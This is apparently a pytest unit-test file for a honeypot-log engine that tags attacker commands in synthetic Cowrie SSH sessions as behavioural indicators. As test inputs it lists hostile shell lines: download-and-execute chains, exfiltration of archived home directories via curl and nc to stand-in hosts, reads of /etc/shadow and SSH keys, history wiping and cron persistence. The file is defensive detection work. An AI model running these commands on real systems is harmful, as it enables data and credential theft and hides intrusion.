"""Unit tests for behavioural_evidence (Task 22). Synthetic Cowrie-style events only; no dataset or test-set access."""
import json
from datetime import datetime, timedelta, timezone

import pytest

from behavioural_evidence import (CATALOGUE_VERSION, INDICATORS, INTERPRETATIONS, AttributionError, CatalogueError,
                                  EvidenceConfig, EvidenceEngine, SchemaError)
from behavioural_evidence.calibration import SensorCalibration, load_calibration
from behavioural_evidence.catalogue import ACTION, CAVEAT, CONTEXT, catalogue_document, check_catalogue
from behavioural_evidence.commandline import parse_line, split_operators
from behavioural_evidence.indicators import NetScope, match_lines

T0 = datetime(2026, 11, 10, 10, 0, 0, tzinfo=timezone.utc)


def ev(sid, eventid, t, src="203.0.113.50", **f):
    e = {"eventid": eventid, "session": sid, "timestamp": (T0 + timedelta(seconds=t)).isoformat().replace("+00:00", "Z"), **f}
    if src is not None:
        e["src_ip"] = src
    return e


def session(sid, t0=0.0, src="203.0.113.50", fail=0, login=True, lines=(), gap=1.0, failed_cmds=(), downloads=(), uploads=()):
    out = [ev(sid, "cowrie.session.connect", t0, src)]
    t = t0 + 0.1
    for k in range(fail):
        out.append(ev(sid, "cowrie.login.failed", t, src, username="root", password=f"p{k}"))
        t += 0.1
    if login:
        out.append(ev(sid, "cowrie.login.success", t, src, username="root", password="ok"))
        for ln in lines:
            t += gap
            out.append(ev(sid, "cowrie.command.input", t, src, input=ln))
            if ln in failed_cmds:
                out.append(ev(sid, "cowrie.command.failed", t + 0.01, src, input=ln))
        for d in downloads:
            out.append(ev(sid, "cowrie.session.file_download", t + 0.2, src, url=d, shasum="ab"))
        for u in uploads:
            out.append(ev(sid, "cowrie.session.file_upload", t + 0.2, src, filename=u, shasum="cd"))
    out.append(ev(sid, "cowrie.session.closed", t + 0.5, src, duration=f"{t + 0.5 - t0:.1f}"))
    return out


def run(events, **cfg):
    return {r["session_ref"]: r for r in EvidenceEngine(EvidenceConfig(**cfg)).evaluate(events)["sessions"]}


def inds(lines, **scope):
    ms, _ = match_lines(lines, NetScope(**scope))
    return {(m.indicator, m.token) for m in ms}


def ids(lines, **scope):
    return {i for i, _ in inds(lines, **scope)}


# ------------------------------------------------------------------------------------------------ catalogue / versions
def test_catalogue_has_25_design_indicators_plus_net0_and_time0():
    assert len(INDICATORS) == 27
    assert "NET-0" in INDICATORS and "TIME-0" in INDICATORS
    assert CATALOGUE_VERSION == "v2-evidence-1.1"


def test_every_interpretation_requires_an_action_indicator():
    for r in INTERPRETATIONS:
        assert r.all_of and all(i in ACTION for i in r.all_of)


def test_kinds_partition_the_catalogue():
    assert ACTION | CONTEXT | CAVEAT == set(INDICATORS) and not (ACTION & CONTEXT) and not (ACTION & CAVEAT)
    assert {"EMU-1", "ART-1", "SEQ-1", "TIME-0"} <= CAVEAT and {"NET-0", "DISC-1", "AUTH-0", "PERS-0"} <= CONTEXT


def test_incompatible_catalogue_version_fails_loudly():
    doc = catalogue_document()
    doc["catalogue_version"] = "v1-legacy"
    with pytest.raises(CatalogueError):
        EvidenceEngine(catalogue=doc)


def test_catalogue_with_changed_indicator_set_or_kind_fails():
    doc = catalogue_document()
    doc["indicators"] = doc["indicators"][:-1]
    with pytest.raises(CatalogueError):
        check_catalogue(doc)
    doc = catalogue_document()
    next(i for i in doc["indicators"] if i["id"] == "NET-0")["kind"] = "action"
    with pytest.raises(CatalogueError):
        check_catalogue(doc)


def test_unsupported_schema_version_fails():
    with pytest.raises(SchemaError):
        EvidenceEngine(EvidenceConfig(telemetry_schema="unsw-nb15"))


def test_missing_required_field_fails_and_v1_fields_rejected():
    e = session("a", lines=["id"])
    del next(x for x in e if x["eventid"] == "cowrie.command.input")["input"]
    with pytest.raises(SchemaError):
        run(e)
    e = session("b", lines=["id"])
    e[0]["ct_src_ltm"] = 3
    with pytest.raises(SchemaError):
        run(e)


def test_missing_source_attribution_fails_loudly():
    with pytest.raises(SchemaError):                       # connect without src_ip: schema violation
        run(session("a", src=None, fail=1))
    no_connect = [e for e in session("a", src=None, fail=1) if e["eventid"] != "cowrie.session.connect"]
    with pytest.raises(AttributionError):                  # login events with no source anywhere in the session
        run(no_connect)


def test_calibration_schema_checked(tmp_path):
    p = tmp_path / "c.json"
    p.write_text(json.dumps({"schema": "other"}))
    with pytest.raises(CatalogueError):
        load_calibration(p)


# ------------------------------------------------------------------------------------------------------- tokenisation
def test_operators_split_outside_quotes_only():
    segs, has = split_operators("echo 'a;b|c' | grep a && ls; id || w")
    assert [s for s, _ in segs] == ["echo 'a;b|c'", "grep a", "ls", "id", "w"] and has
    segs, has = split_operators("echo 'a;b'")
    assert len(segs) == 1 and not has


def test_order_redirections_and_sudo_wrapper():
    cmds, _ = parse_line("sudo -u root cat /etc/shadow 2>/dev/null > out.txt", 3)
    c = cmds[0]
    assert c.wrapper == "sudo" and c.name == "cat" and c.argv == ["cat", "/etc/shadow"] and c.line_index == 3
    assert ("2>", "/dev/null") in c.redirections and (">", "out.txt") in c.redirections


def test_parse_degraded_flag_on_bad_quoting():
    cmds, _ = parse_line("echo 'unterminated")
    assert cmds[0].parse_degraded


# ------------------------------------------------------------------------------------------- no substring false matches
@pytest.mark.parametrize("line", ["service ssh status", "ps aux | grep sshd", "cat /etc/passwd | grep sh", "cat /etc/issue",
                                  "find / -perm -u=s -type f 2>/dev/null", "lscpu", "groups", "ls -la /etc/passwd",
                                  "echo shadowsocks", "cat /etc/shadow.bak.txt.old"])
def test_old_substring_hits_do_not_produce_credential_or_transfer(line):
    got = ids([line])
    assert not got & {"CRED-1", "XFER-1", "XFER-2", "EVADE-1", "PERS-1", "NET-1"}


def test_whole_token_discovery_only():
    assert ids(["w"]) == {"DISC-1"} and "DISC-1" not in ids(["cat /etc/passwd"])


# ------------------------------------------------------------------------------------------------------------ indicators
@pytest.mark.parametrize("line,expected", [
    ("sudo -l", "PRIV-1"), ("cat /etc/sudoers", "PRIV-1"), ("find / -perm -4000 -type f", "PRIV-1"), ("ls -la /root", "PRIV-1"),
    ("cat /etc/shadow", "CRED-1"), ("cat ~/.ssh/known_hosts", "CRED-1"), ("find / -name id_rsa", "CRED-1"),
    ("find /home -name '*.db'", "FILE-1"), ("du -sh /home", "FILE-2"), ("ls -R /var", "FILE-2"),
    ("wget http://h.example/x.sh", "XFER-1"), ("curl -O http://h.example/x", "XFER-1"), ("scp u@h:/f ./f", "XFER-1"),
    ("curl -T /tmp/d.tgz http://h/u", "XFER-2"), ("scp /tmp/d u@h:/x", "XFER-2"), ("nc 10.0.0.2 80 < /tmp/d", "XFER-2"),
    ("tar czf /tmp/d.tgz /home", "STAGE-1"), ("zip -r a.zip /home", "STAGE-1"),
    ("history -c", "EVADE-1"), ("unset HISTFILE", "EVADE-1"), ("rm ~/.bash_history", "EVADE-1"),
    ("crontab -e", "PERS-1"), ("echo x >> /etc/rc.local", "PERS-1"), ("systemctl enable evil", "PERS-1"),
    ("crontab -l", "PERS-0"), ("service ssh status", "PERS-0"),
    ("nmap -sS 192.0.2.1", "NET-1"), ("nc -zv 192.0.2.12 22", "NET-1"), ("ping -c 2 10.1.2.3", "NET-1"),
    ("sudo apt update", "PRIV-2"), ("echo a > out.txt", "REDIR-1"), ("ls | wc -l", "CHAIN-1"),
])
def test_indicator_semantics(line, expected):
    assert expected in ids([line])


def test_curl_head_is_context_only():
    got = ids(["curl -I http://mirror.example/"])
    assert got == {"NET-0"} and not got & ACTION


def test_reachability_to_non_qualifying_target_is_context():
    assert ids(["ping -c 2 8.8.8.8"]) == {"NET-0"}
    assert ids(["ping -c 2 192.0.2.5"]) == {"NET-0"}                       # documentation range not internal by default
    assert "NET-1" in ids(["ping -c 2 192.0.2.5"], internal_hosts=("192.0.2.5",))


def test_redirect_to_dev_null_is_not_redir():
    assert "REDIR-1" not in ids(["find / -name x 2>/dev/null"])


def test_exec_requires_same_file_and_order():
    assert "EXEC-1" in ids(["wget http://h.example/a.sh", "chmod +x a.sh", "./a.sh"])
    assert "EXEC-1" not in ids(["./a.sh", "wget http://h.example/a.sh"])
    assert "EXEC-1" not in ids(["wget http://h.example/a.sh", "./b.sh"])
    assert "EXEC-1" not in ids(["wget -qO- http://h.example/ip", "./ip"])


# ---------------------------------------------------------------------------------------------------- authentication
def test_single_failed_login_is_never_credential_attack():
    r = run(session("a", fail=1, login=False))["a"]
    assert r["interpretations"] == [] and "AUTH-0" in r["context_indicators"] and "AUTH-1" not in r["action_indicators"]
    assert r["authentication_status"] == "below_threshold"


def test_three_failures_within_window_same_source():
    ev_ = session("a", t0=0, fail=1, login=False) + session("b", t0=60, fail=1, login=False) + session("c", t0=120, fail=1, login=False)
    out = run(ev_)
    assert all("repeated authentication failures" in [i["name"] for i in out[s]["interpretations"]] for s in "abc")


def test_failures_outside_window_or_other_sources_do_not_count():
    ev_ = session("a", t0=0, fail=1, login=False) + session("b", t0=200, fail=1, login=False) + session("c", t0=600, fail=1, login=False)
    assert not any(r["interpretations"] for r in run(ev_).values())
    ev_ = (session("a", fail=1, login=False, src="203.0.113.1") + session("b", t0=10, fail=1, login=False, src="203.0.113.2")
           + session("c", t0=20, fail=1, login=False, src="203.0.113.3"))
    assert not any(r["interpretations"] for r in run(ev_).values())


def test_duplicate_failure_events_are_not_distinct():
    e = session("a", fail=1, login=False)
    dup = [x for x in e if x["eventid"] == "cowrie.login.failed"][0]
    e = e + [dict(dup), dict(dup)]
    assert run(e)["a"]["authentication_status"] == "below_threshold"


def test_relay_source_is_indeterminate():
    ev_ = session("a", fail=5, login=False, src="172.22.0.2")
    r = run(ev_, relay_sources=frozenset({"172.22.0.2"}))["a"]
    assert r["authentication_status"] == "indeterminate:shared_source" and r["behavioural_status"] == "indeterminate"
    assert r["interpretations"] == []


def test_success_after_repeated_failures_is_auth2_and_coexists():
    ev_ = session("a", fail=4, login=True, lines=["history -c"])
    r = run(ev_)["a"]
    names = {i["name"] for i in r["interpretations"]}
    assert {"credential guessing followed by login", "repeated authentication failures", "history tampering attempt"} <= names
    assert {"AUTH-1", "AUTH-2"} <= set(r["action_indicators"])
    assert r["authentication_status"] == "repeated_failures+success"


# -------------------------------------------------------------------------------------- outcomes / levels / abstention
def test_download_attempt_without_event_is_not_observed():
    r = run(session("a", lines=["wget http://h.example/x.sh"]))["a"]
    i = next(x for x in r["indicators"] if x["id"] == "XFER-1")
    assert i["outcome"] == "not_observed" and r["evidence_level"] == "E1"


def test_download_with_event_is_observed_success_and_e3_with_exec():
    r = run(session("a", lines=["wget http://h.example/x.sh", "sh x.sh"], downloads=["http://h.example/x.sh"]))["a"]
    lv = {i["name"]: i["evidence_level"] for i in r["interpretations"]}
    assert lv["download-and-execute attempt"] == "E3" and r["evidence_level"] == "E3"


def test_upload_attempt_without_event_never_success():
    r = run(session("a", lines=["tar czf /tmp/d.tgz /home", "curl -T /tmp/d.tgz http://h/u"]))["a"]
    assert next(x for x in r["indicators"] if x["id"] == "XFER-2")["outcome"] == "not_observed"
    assert {"archive-and-upload attempt", "upload attempt"} <= {i["name"] for i in r["interpretations"]}
    assert all(i["evidence_level"] != "E3" for i in r["interpretations"])


def test_emulator_rejection_recorded_as_emulator_failure():
    r = run(session("a", lines=["wget http://h.example/p", "chmod +x p", "./p"], failed_cmds=["./p"]))["a"]
    assert "EMU-1" in r["caveat_indicators"]
    assert next(x for x in r["indicators"] if x["id"] == "EXEC-1")["outcome"] == "observed_failure:emulator_rejected"


def test_context_only_session_is_not_interpreted():
    r = run(session("a", lines=["w", "uname -a", "curl -I http://m.example/", "ls | wc -l", "service ssh status", "du -sh /"]))["a"]
    assert r["interpretations"] == [] and r["behavioural_status"] == "system_discovery_only" and r["evidence_level"] == "E0"


def test_no_input_is_insufficient_evidence():
    r = run(session("a", lines=[]))["a"]
    assert r["behavioural_status"] == "insufficient_evidence" and r["abstention_reason"] == "no command input"


def test_priv_probe_alone_does_not_satisfy_privilege_recon():
    r = run(session("a", lines=["sudo -l"]))["a"]
    assert r["interpretations"] == [] and r["behavioural_status"] == "insufficient_evidence" and r["evidence_level"] == "E1"


def test_e2_when_two_action_indicators_support_one_interpretation():
    r = run(session("a", lines=["sudo -l", "cat /etc/shadow"]))["a"]
    lv = {i["name"]: i["evidence_level"] for i in r["interpretations"]}
    assert lv["privilege-context reconnaissance attempt"] == "E2"


# --------------------------------------------------------------------------------------------------- caveats/novelty
def test_slow_command_is_caveat_only():
    cal = SensorCalibration(sensor="s", version="1", slow_commands=("find / -name id_rsa 2>/dev/null",), source="test")
    with_cal = run(session("a", lines=["find / -name id_rsa 2>/dev/null"], gap=12.0), calibration=cal)["a"]
    without = run(session("a", lines=["find / -name id_rsa 2>/dev/null"], gap=12.0))["a"]
    assert "ART-1" in with_cal["caveat_indicators"] and "ART-1" not in with_cal["action_indicators"]
    assert with_cal["interpretations"] == without["interpretations"] and with_cal["evidence_level"] == without["evidence_level"]


def test_unusual_timing_caveat_does_not_change_interpretation():
    cal = SensorCalibration(sensor="s", version="1", inter_input_gap_reference_p99_s=5.0, source="test")
    a = run(session("a", lines=["w", "id"], gap=30.0), calibration=cal)["a"]
    assert "TIME-0" in a["caveat_indicators"] and a["interpretations"] == [] and a["evidence_level"] == "E0"


def test_sequence_repeat_is_caveat_only():
    r = run(session("a", lines=["whoami"]), reference_sequences=frozenset({("whoami",)}))["a"]
    assert r["caveat_indicators"] == ["SEQ-1"] and not r["interpretations"]


def test_novelty_is_separate_and_does_not_change_behaviour():
    eng = EvidenceEngine(EvidenceConfig())
    e = session("a", lines=["wget http://h.example/x"])
    base = eng.evaluate(e)["sessions"][0]
    nov = eng.evaluate(e, novelty={"a": {"C_input_knn": 9.9, "flag": True}})["sessions"][0]
    assert nov["statistical_novelty"]["value"]["flag"] is True
    strip = lambda r: {k: v for k, v in r.items() if k != "statistical_novelty"}  # noqa: E731
    assert strip(base) == strip(nov)


def test_no_probability_or_legacy_fields_in_output():
    r = run(session("a", lines=["wget http://h.example/x"]))["a"]
    text = json.dumps(r).lower()
    for banned in ("probability", "known-like", "potentially novel", "ambiguous", "dec_cluster", "cluster_id"):
        assert banned not in text


def test_deterministic_output():
    e = session("a", lines=["sudo -l", "cat /etc/shadow", "wget http://h.example/x", "./x"]) + session("b", t0=5, fail=1, login=False)
    a = json.dumps(EvidenceEngine(EvidenceConfig()).evaluate(e), sort_keys=True)
    b = json.dumps(EvidenceEngine(EvidenceConfig()).evaluate(list(reversed(e))), sort_keys=True)
    assert a == b


def test_every_match_cites_line_and_token():
    r = run(session("a", lines=["sudo -l", "wget http://h.example/x"]))["a"]
    for i in r["indicators"]:
        if i["id"] in ("SHELL-1",):
            continue
        for m in i["matches"]:
            assert m["token"] and (m["line"] or i["id"].startswith(("AUTH", "XFER-1-OK", "XFER-2-OK", "TIME")))
